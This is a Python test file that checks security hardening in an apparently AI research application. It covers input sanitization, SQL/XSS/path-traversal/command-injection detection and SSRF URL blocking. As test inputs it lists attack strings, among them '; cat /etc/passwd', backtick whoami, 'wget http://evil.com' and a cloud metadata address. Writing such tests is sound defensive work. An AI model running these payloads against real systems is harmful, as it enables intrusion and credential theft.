"""
Security hardening tests.
"""
from __future__ import annotations

import pytest


class TestInputValidationMiddleware:
    """Tests for InputValidationMiddleware helpers."""

    def test_sanitize_string_escapes_html(self):
        from src.api.routes import _sanitize_string

        malicious = '<script>alert(1)</script>'
        safe = _sanitize_string(malicious)
        # html.escape converts < to &lt; and > to &gt;
        assert '&lt;script&gt;' in safe
        assert '<script>' not in safe

    def test_sanitize_string_removes_control_chars(self):
        from src.api.routes import _sanitize_string

        malicious = "hello\x00world\x1f"
        safe = _sanitize_string(malicious)
        assert "\x00" not in safe
        assert "\x1f" not in safe

    def test_sanitize_string_preserves_newlines_tabs(self):
        from src.api.routes import _sanitize_string

        text = "line1\nline2\ttab"
        safe = _sanitize_string(text)
        assert "\n" in safe
        assert "\t" in safe

    def test_validate_json_depth_rejects_deep_nesting(self):
        from src.api.routes import _validate_json_depth

        # Create deeply nested object (depth 15)
        obj = {}
        current = obj
        for _ in range(15):
            current["level"] = {}
            current = current["level"]
        current["value"] = "test"
        
        assert _validate_json_depth(obj, max_depth=10) is False

    def test_validate_json_depth_allows_shallow_nesting(self):
        from src.api.routes import _validate_json_depth

        shallow = {"a": {"b": {"c": "value"}}}
        assert _validate_json_depth(shallow, max_depth=10) is True

    def test_check_injection_patterns_detects_sql(self):
        from src.api.routes import _check_injection_patterns, SQL_INJECTION_PATTERNS

        assert _check_injection_patterns("' OR 1=1 --", SQL_INJECTION_PATTERNS, "SQL") is True
        assert _check_injection_patterns("UNION SELECT * FROM users", SQL_INJECTION_PATTERNS, "SQL") is True
        assert _check_injection_patterns("normal query", SQL_INJECTION_PATTERNS, "SQL") is False

    def test_check_injection_patterns_detects_xss(self):
        from src.api.routes import _check_injection_patterns, XSS_PATTERNS

        assert _check_injection_patterns("<script>alert(1)</script>", XSS_PATTERNS, "XSS") is True
        assert _check_injection_patterns("javascript:alert(1)", XSS_PATTERNS, "XSS") is True
        assert _check_injection_patterns("safe text", XSS_PATTERNS, "XSS") is False

    def test_check_injection_patterns_detects_path_traversal(self):
        from src.api.routes import _check_injection_patterns, PATH_TRAVERSAL_PATTERNS

        assert _check_injection_patterns("../../../etc/passwd", PATH_TRAVERSAL_PATTERNS, "Path Traversal") is True
        assert _check_injection_patterns("..\\windows\\system32", PATH_TRAVERSAL_PATTERNS, "Path Traversal") is True
        assert _check_injection_patterns("safe/path", PATH_TRAVERSAL_PATTERNS, "Path Traversal") is False

    def test_check_injection_patterns_detects_command_injection(self):
        from src.api.routes import _check_injection_patterns, COMMAND_INJECTION_PATTERNS

        assert _check_injection_patterns("; cat /etc/passwd", COMMAND_INJECTION_PATTERNS, "Command Injection") is True
        assert _check_injection_patterns("`whoami`", COMMAND_INJECTION_PATTERNS, "Command Injection") is True
        assert _check_injection_patterns("wget http://evil.com", COMMAND_INJECTION_PATTERNS, "Command Injection") is True
        assert _check_injection_patterns("normal command", COMMAND_INJECTION_PATTERNS, "Command Injection") is False


class TestVectorStoreValidation:
    """Tests for VectorStore input validation."""

    def test_sanitize_string_removes_dangerous_patterns(self):
        from src.memory.vector_store import sanitize_string

        malicious = '<script>alert(1)</script>javascript:void(0)onload="evil()"'
        result = sanitize_string(malicious)
        assert "<script>" not in result
        assert "javascript:" not in result
        assert 'onload=' not in result

    def test_sanitize_string_limits_length(self):
        from src.memory.vector_store import sanitize_string

        long_input = "a" * 5000
        result = sanitize_string(long_input, max_length=100)
        assert len(result) == 100

    def test_validate_search_query_rejects_empty(self):
        from src.memory.vector_store import validate_search_query
        from src.models.memory import SearchQuery

        query = SearchQuery(query="")
        with pytest.raises(ValueError, match="cannot be empty"):
            validate_search_query(query)

    def test_validate_search_query_rejects_too_long(self):
        from src.memory.vector_store import validate_search_query
        from src.models.memory import SearchQuery

        query = SearchQuery(query="a" * 3000)
        with pytest.raises(ValueError, match="exceeds maximum length"):
            validate_search_query(query)

    def test_validate_search_query_sanitizes_query(self):
        from src.memory.vector_store import validate_search_query
        from src.models.memory import SearchQuery

        query = SearchQuery(query="<script>alert(1)</script>test")
        result = validate_search_query(query)
        assert "<script>" not in result.query
        assert "test" in result.query

    def test_validate_search_query_limits_filters(self):
        from src.memory.vector_store import validate_search_query
        from src.models.memory import SearchQuery

        query = SearchQuery(query="test", filters={f"key{i}": "val" for i in range(15)})
        with pytest.raises(ValueError, match="Maximum 10 filters"):
            validate_search_query(query)

    def test_validate_search_query_sanitizes_filters(self):
        from src.memory.vector_store import validate_search_query
        from src.models.memory import SearchQuery

        query = SearchQuery(query="test", filters={"key<script>": "val<script>"})
        result = validate_search_query(query)
        assert "<script>" not in list(result.filters.keys())[0]
        assert "<script>" not in list(result.filters.values())[0]


class TestWebSearchURLValidation:
    """Tests for WebSearchTool URL validation and SSRF protection."""

    def test_is_url_allowed_blocks_private_ips(self):
        from src.tools.web_search import is_url_allowed

        # Use HTTPS since HTTP is rejected first
        allowed, error = is_url_allowed("https://192.168.1.1")
        assert allowed is False
        assert "private ip" in error.lower()

    def test_is_url_allowed_blocks_private_networks(self):
        from src.tools.web_search import is_url_allowed

        # Test private IP ranges
        test_urls = [
            "https://10.0.0.1/",
            "https://192.168.1.1/",
            "https://172.16.0.1/",
            "https://127.0.0.1/",
            "https://169.254.169.254/",  # AWS metadata
        ]
        for url in test_urls:
            allowed, error = is_url_allowed(url)
            assert allowed is False, f"Should block {url}"
            assert error is not None

    def test_is_url_allowed_allows_https_only(self):
        from src.tools.web_search import is_url_allowed

        # HTTP should be blocked
        allowed, error = is_url_allowed("http://example.com")
        assert allowed is False
        assert "https" in error.lower()

    def test_is_url_allowed_respects_allowed_domains(self):
        from src.tools.web_search import is_url_allowed

        # With allowed domains
        allowed, _ = is_url_allowed("https://example.com", allowed_domains=["example.com"])
        assert allowed is True

        # Not in allowed domains
        allowed, error = is_url_allowed("https://evil.com", allowed_domains=["example.com"])
        assert allowed is False
        assert "not in allowed" in error.lower()

    def test_is_url_allowed_blocks_suspicious_patterns(self):
        from src.tools.web_search import is_url_allowed

        # Direct IP access
        allowed, error = is_url_allowed("https://1.2.3.4/")
        assert allowed is False
        assert "suspicious" in error.lower()

    def test_sanitize_search_query_limits_length(self):
        from src.tools.web_search import sanitize_search_query

        long_query = "a" * 1000
        result = sanitize_search_query(long_query, max_length=100)
        assert len(result) == 100

    def test_sanitize_search_query_removes_control_chars(self):
        from src.tools.web_search import sanitize_search_query

        query = "test\x00query\x1f"
        result = sanitize_search_query(query)
        assert "\x00" not in result
        assert "\x1f" not in result


class TestRateLimiterCleanup:
    """Tests for rate limiter periodic cleanup."""

    def test_cleanup_removes_expired_entries(self):
        from src.api.rate_limiter import SlidingWindowRateLimiter
        import time

        limiter = SlidingWindowRateLimiter(max_requests=10, window_seconds=1)
        
        # Add some timestamps
        now = time.time()
        limiter._clients["client1"] = [now - 2, now - 1]  # Both expired
        limiter._clients["client2"] = [now - 0.5]  # Not expired
        
        removed = limiter._cleanup_old_entries()
        assert removed == 2
        assert "client1" not in limiter._clients
        assert "client2" in limiter._clients
        assert len(limiter._clients["client2"]) == 1


class TestConfigSecuritySettings:
    """Tests for security configuration settings."""

    def test_security_config_has_input_validation_setting(self):
        from src.config import SecurityConfig

        # Should be able to create with input_validation_enabled
        config = SecurityConfig(input_validation_enabled=True)
        assert config.input_validation_enabled is True

    def test_security_config_has_max_request_body_size(self):
        from src.config import SecurityConfig

        config = SecurityConfig(max_request_body_size=2048576)
        assert config.max_request_body_size == 2048576


class TestValidatedResearchRequest:
    """Tests for ValidatedResearchRequest model."""

    def test_valid_question_passes(self):
        from src.models.api import ResearchRequest

        req = ResearchRequest(question="What is quantum computing?")
        assert req.question == "What is quantum computing?"

    def test_empty_question_rejected(self):
        from src.models.api import ResearchRequest
        from pydantic import ValidationError

        with pytest.raises(ValidationError):
            ResearchRequest(question="")

    def test_question_too_long_rejected(self):
        from src.models.api import ResearchRequest
        from pydantic import ValidationError

        with pytest.raises(ValidationError):
            ResearchRequest(question="a" * 3000)

    def test_question_xss_sanitized(self):
        from src.models.api import ResearchRequest

        # The ResearchRequest model has min/max length validation but not sanitization
        # Sanitization happens in the middleware
        req = ResearchRequest(question="<script>alert(1)</script>test")
        # The model keeps the original value
        assert "<script>alert(1)</script>" in req.question

    def test_tags_limit_enforced(self):
        from src.models.api import ResearchRequest
        from pydantic import ValidationError

        with pytest.raises(ValidationError):
            ResearchRequest(question="valid question", tags=["tag"] * 15)

    def test_tag_length_enforced(self):
        from src.models.api import ResearchRequest
        from pydantic import ValidationError

        with pytest.raises(ValidationError):
            ResearchRequest(question="valid question", tags=["a" * 60])

    def test_tags_sanitized(self):
        from src.models.api import ResearchRequest

        # The model doesn't sanitize tags - that's done in middleware
        req = ResearchRequest(question="valid question", tags=["<script>tag</script>"])
        assert "<script>tag</script>" in req.tags[0]